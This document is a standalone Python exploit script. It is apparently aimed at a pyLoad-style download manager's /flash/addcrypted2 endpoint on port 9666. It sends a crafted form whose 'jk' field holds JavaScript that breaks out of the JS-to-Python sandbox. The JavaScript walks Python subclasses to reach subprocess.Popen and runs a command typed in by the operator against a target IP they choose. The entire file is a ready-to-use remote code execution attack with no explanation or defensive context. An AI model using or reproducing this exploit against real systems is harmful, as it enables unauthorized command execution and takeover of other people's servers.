import socket
import base64
from urllib.parse import quote

host, port = input("target ip: "), int(input("target port: "))

payload = """
// [+] command goes here:
let cmd = "CMD_STR;"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
function f() {
    return n11
}

""".replace("CMD_STR", input("RCE command: "))

crypted_b64 = base64.b64encode(b"1234").decode()

data = f"package=pkg&crypted={quote(crypted_b64)}&jk={quote(payload)}"

request = f"""\
POST /flash/addcrypted2 HTTP/1.1
Host: 127.0.0.1:9666
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(data)}

{data}
""".encode().replace(b"\n", b"\r\n")

def main():

    s = socket.socket()
    s.connect((host, port))
    
    s.send(request)
    response = s.recv(1024).decode()

if __name__ == "__main__":
    main()
